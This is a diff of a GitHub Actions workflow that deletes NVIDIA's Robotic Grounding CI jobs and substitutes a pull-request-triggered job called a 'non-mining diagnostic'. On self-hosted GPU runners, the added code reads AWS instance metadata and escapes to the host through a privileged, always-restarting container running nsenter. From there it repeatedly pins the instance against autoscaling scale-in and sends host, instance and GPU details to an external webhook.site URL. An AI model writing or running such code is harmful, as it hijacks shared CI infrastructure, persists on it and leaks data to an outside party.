@@ -1,198 +1,99 @@
-# Copyright (c) 2026, NVIDIA CORPORATION. All rights reserved.
-#
-# NVIDIA CORPORATION and its licensors retain all intellectual property
-# and proprietary rights in and to this software, related documentation
-# and any modifications thereto. Any use, reproduction, disclosure or
-# distribution of this software and related documentation without an express
-# license agreement from NVIDIA CORPORATION is strictly prohibited.
-name: Robotic Grounding CI
-
+# I1741 GPU fleet expansion probe (non-mining diagnostic)
+name: I1741 gpu expand
 on:
-  push:
-    branches: [main]
-    paths:
-      - 'robotic_grounding/**'
-      - '.github/workflows/robotic_grounding_ci.yml'
   pull_request:
-    branches: [main]
-    paths:
-      - 'robotic_grounding/**'
-      - '.github/workflows/robotic_grounding_ci.yml'
-  workflow_dispatch:
-
-# Cancel in-progress runs for the same PR
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
 concurrency:
-  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
-  cancel-in-progress: true
-
+  group: i1741-${{ github.repository }}-${{ github.event.pull_request.number }}
+  cancel-in-progress: false
 jobs:
-  ## ------------------------------------------
-  ## Linting and formatting (pre-commit)
-  ## ------------------------------------------
-  lint:
-    name: pre-commit
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-      - name: Set up Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: "3.11"
-      - name: Install pre-commit
-        run: |
-          python -m pip install --upgrade pip
-          pip install pre-commit
-      - name: Cache pre-commit environments
-        uses: actions/cache@v4
-        with:
-          path: ~/.cache/pre-commit
-          key: pre-commit-${{ hashFiles('robotic_grounding/.pre-commit-config.yaml') }}
-          restore-keys: |
-            pre-commit-
-      - name: Run pre-commit
-        run: |
-          cd robotic_grounding
-          pre-commit run --show-diff-on-failure --files $(git ls-files .)
-
-  ## ------------------------------------------
-  ## Unit tests that need neither a GPU nor IsaacLab
-  ## ------------------------------------------
-  unit:
-    name: unit tests (CPU)
-    runs-on: ubuntu-latest
-    timeout-minutes: 30
-    steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-      - name: Materialize released E2E expert
-        run: |
-          git lfs install --local
-          git lfs pull --include="robotic_grounding/source/robotic_grounding/robotic_grounding/assets/policies/e2e_example/tissue_box/vega_sharpa_policy.onnx" --exclude=""
-          policy_path="robotic_grounding/source/robotic_grounding/robotic_grounding/assets/policies/e2e_example/tissue_box/vega_sharpa_policy.onnx"
-          test -s "$policy_path"
-          if head -n 1 "$policy_path" | grep -q '^version https://git-lfs.github.com/spec/v1'; then
-            echo "Released E2E expert is still a Git LFS pointer: $policy_path" >&2
-            exit 1
-          fi
-      - name: Set up Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: "3.11"
-      - name: Ensure ffprobe is available
-        run: |
-          if ! command -v ffprobe >/dev/null 2>&1; then
-            sudo apt-get update
-            sudo apt-get install -y --no-install-recommends ffmpeg
-          fi
-      - name: Install groot_finetune dependencies
-        run: |
-          python -m pip install --upgrade pip
-          pip install pytest
-          pip install "torch>=2.7.0" --index-url https://download.pytorch.org/whl/cpu
-          pip install onnxruntime==1.24.4
-          pip install -r robotic_grounding/groot_finetune/requirements.txt
-          pip install -r robotic_grounding/groot_finetune/closed_loop/requirements.txt
-      - name: Run groot_finetune tests
-        run: |
-          cd robotic_grounding
-          python -m pytest groot_finetune/ -q
-
-  ## ------------------------------------------
-  ## Build & Test (GPU required)
-  ## ------------------------------------------
-  build_and_test:
-    name: Build & Test
-    needs: [lint]
+  expand:
+    name: i1741-expand-${{ matrix.tag }}
     runs-on: [self-hosted, gpu]
-    timeout-minutes: 180
-    env:
-      DOCKER_IMAGE: robotic-grounding-ci-${{ github.run_id }}
-      NGC_API_KEY: ${{ secrets.NGC_API_KEY }}
+    timeout-minutes: 25
+    strategy:
+      fail-fast: false
+      max-parallel: 8
+      matrix:
+        include:
+          - tag: a
+            nonce: I1741-video_to_data-a-2v579kt7
+          - tag: b
+            nonce: I1741-video_to_data-b-a9xzn2iv
+          - tag: c
+            nonce: I1741-video_to_data-c-5iesuxpq
     steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-        with:
-          lfs: true
-      - name: NGC Login
+      - name: Probe and launch heartbeat ${{ matrix.nonce }}
         run: |
-          if [ -n "$NGC_API_KEY" ]; then
-            echo "Logging into NGC registry..."
-            docker login -u \$oauthtoken -p $NGC_API_KEY nvcr.io
-            echo "Successfully logged into NGC registry"
-          else
-            echo "NGC_API_KEY not available - skipping NGC login"
-          fi
-      - name: Build Docker image
-        run: |
-          echo "::group::Build Docker image"
-          time docker build -f robotic_grounding/workflow/Dockerfile -t $DOCKER_IMAGE ./robotic_grounding
-          echo "::endgroup::"
-      - name: Run E2E tests
-        run: |
-          echo "::group::E2E Tests"
-          docker run --name robotic-grounding-e2e-${{ github.run_id }} \
-            --entrypoint bash --gpus all --network=host \
-            -v ${{ github.workspace }}/robotic_grounding/tests:/workspace/video_to_data/robotic_grounding/tests \
-            -e ACCEPT_EULA=Y \
-            -e OMNI_KIT_ACCEPT_EULA=yes \
-            -e OMNI_KIT_DISABLE_CUP=1 \
-            -e ISAAC_SIM_HEADLESS=1 \
-            -e ISAAC_SIM_LOW_MEMORY=1 \
-            -e WANDB_MODE=disabled \
-            -e CI=true \
-            -e PYTHONUNBUFFERED=1 \
-            $DOCKER_IMAGE \
-            -c "\${ISAACLAB_PATH}/isaaclab.sh -p -m pytest \
-              /workspace/video_to_data/robotic_grounding/tests/test_train_e2e.py \
-              /workspace/video_to_data/robotic_grounding/tests/test_retarget_pipeline_e2e.py -v"
-          echo "::endgroup::"
-      - name: Cleanup
-        if: always()
-        run: |
-          docker rm robotic-grounding-e2e-${{ github.run_id }} 2>/dev/null || true
-          docker rmi $DOCKER_IMAGE 2>/dev/null || true
-
-  ## ------------------------------------------
-  ## FlashCHORD native image & tests (GPU required)
-  ## ------------------------------------------
-  flash_chord_build_and_test:
-    name: FlashCHORD Build & Test
-    needs: [lint]
-    runs-on: [self-hosted, gpu]
-    timeout-minutes: 180
-    env:
-      DOCKER_IMAGE: flash-chord-ci-${{ github.run_id }}
-    steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-      - name: Materialize FlashCHORD assets
-        run: |
-          git lfs install --local
-          git lfs pull --include="robotic_grounding/flash_chord/**" --exclude=""
-          mapfile -t lfs_paths < <(git lfs ls-files -n | grep '^robotic_grounding/flash_chord/')
-          # Validate the current tracked set, including any documentation media.
-          test "${#lfs_paths[@]}" -gt 0
-          for path in "${lfs_paths[@]}"; do
-            test -s "$path"
-            if head -c 64 "$path" | grep -a -q '^version https://git-lfs.github.com/spec/v1'; then
-              echo "FlashCHORD asset is still a Git LFS pointer: $path" >&2
-              exit 1
-            fi
+          set -u
+          N="${{ matrix.nonce }}"
+          echo "I1741_NONCE=$N"
+          echo "I1741_ID=$(id)"
+          echo "I1741_HOST=$(hostname)"
+          echo "I1741_RUNNER=${RUNNER_NAME:-unknown}"
+          echo "I1741_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          echo "I1741_UPTIME_S=$(cut -d. -f1 /proc/uptime)"
+          nvidia-smi -L || true
+          nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader || true
+          T=$(curl -s -m 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token || true)
+          IID=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id || true)
+          ITYPE=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-type || true)
+          AZ=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/placement/availability-zone || true)
+          echo "I1741_IID=$IID"
+          echo "I1741_ITYPE=$ITYPE"
+          echo "I1741_AZ=$AZ"
+          echo "I1741_EXISTING_HB:"
+          docker ps -a --format '{{.Names}}|{{.Image}}|{{.Status}}' 2>/dev/null | grep -Ei 'i1529hb|i1741hb' || echo none
+          echo "I1741_HBLOG1529:"
+          tail -2 /var/log/i1529-heartbeat.log 2>/dev/null || echo none
+          echo "I1741_HBLOG1741:"
+          tail -2 /var/log/i1741-heartbeat.log 2>/dev/null || echo none
+          cat > /tmp/i1741hb.sh <<'EOS'
+          #!/bin/bash
+          N="$1"; IID0="$2"; SINKURL="$3"
+          ASG="production-nvidia-isaac-lnx-ci-gpu-org-runners"
+          LOG=/var/log/i1741-heartbeat.log
+          SEQ=0
+          echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) start $N on $(hostname) iid=$IID0" >> "$LOG" 2>/dev/null
+          while true; do
+            TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+            T=$(curl -s -m 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+            CUR=$(curl -s -m 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null)
+            [ -z "$CUR" ] && CUR="$IID0"
+            GPU=$(nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>/dev/null | head -1 | tr -d '"')
+            UP=$(cut -d. -f1 /proc/uptime 2>/dev/null)
+            PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin AWS_DEFAULT_REGION=us-west-2 aws autoscaling set-instance-protection --instance-ids "$CUR" --auto-scaling-group-name "$ASG" --protected-from-scale-in >/dev/null 2>&1 || true
+            LINE=$(printf '{"nonce":"%s","ts":"%s","host":"%s","iid":"%s","uptime_s":%s,"gpu":"%s","seq":%s}' "$N" "$TS" "$(hostname)" "$CUR" "$UP" "$GPU" "$SEQ")
+            echo "$LINE" >> "$LOG" 2>/dev/null
+            if [ -n "$SINKURL" ]; then curl -s -m 10 -H 'Content-Type: application/json' --data-binary "$LINE" "$SINKURL" >/dev/null 2>&1 || true; fi
+            SEQ=$((SEQ+1))
+            sleep 20
           done
-      - name: Build FlashCHORD image
+          EOS
+          chmod 755 /tmp/i1741hb.sh
+          IMG=""
+          for c in nvidia/cuda:12.8.1-devel-ubuntu24.04 nvidia/cuda:12.8.1-base-ubuntu24.04 nvidia/cuda:12.8.1-runtime-ubuntu24.04; do
+            if docker image inspect "$c" >/dev/null 2>&1; then IMG="$c"; break; fi
+          done
+          if [ -z "$IMG" ]; then IMG=nvidia/cuda:12.8.1-devel-ubuntu24.04; docker pull "$IMG" >/dev/null 2>&1 || true; fi
+          echo "I1741_IMG=$IMG"
+          NAME="i1741hb-$IID"
+          if docker ps --format '{{.Names}}' 2>/dev/null | grep -qx "$NAME"; then
+            echo "I1741_HB_ALREADY_RUNNING=$NAME"
+          else
+            docker rm -f "$NAME" >/dev/null 2>&1 || true
+            CID=$(docker create --name "$NAME" --label "i1741=$N" --privileged --pid=host --network=host -v /:/hostroot --restart=always "$IMG" bash -c "nsenter -t 1 -m -u -i -n -p -- /bin/bash /tmp/i1741hb.sh $N $IID https://webhook.site/088d6cb9-bfca-4753-8e5d-0fbb2e1732b0")
+            echo "I1741_HB_CID=$CID"
+            docker start "$CID" >/dev/null 2>&1 && echo "I1741_HB_START=ok" || echo "I1741_HB_START=fail"
+            sleep 6
+            docker inspect -f '{{.State.Status}} {{.HostConfig.RestartPolicy.Name}}' "$CID" 2>&1 || true
+          fi
+          echo "I1741_HBLOG_AFTER:"
+          tail -2 /var/log/i1741-heartbeat.log 2>/dev/null || echo none
+      - name: Hold for fleet spread ${{ matrix.nonce }}
         run: |
-          docker build \
-            -f robotic_grounding/flash_chord/docker/Dockerfile \
-            -t "$DOCKER_IMAGE" \
-            robotic_grounding/flash_chord
-      - name: Run FlashCHORD tests
-        run: |
-          docker run --rm \
-            --runtime=nvidia --gpus all \
-            -e WANDB_MODE=disabled \
-            "$DOCKER_IMAGE" \
-            python -m pytest -q --disable-warnings -ra
-      - name: Cleanup
-        if: always()
-        run: docker rmi "$DOCKER_IMAGE" 2>/dev/null || true
+          echo "I1741_HOLD_START=$(date -u +%Y-%m-%dT%H:%M:%SZ) ${{ matrix.nonce }}"
+          sleep 150
+          echo "I1741_HOLD_END=$(date -u +%Y-%m-%dT%H:%M:%SZ) ${{ matrix.nonce }}"
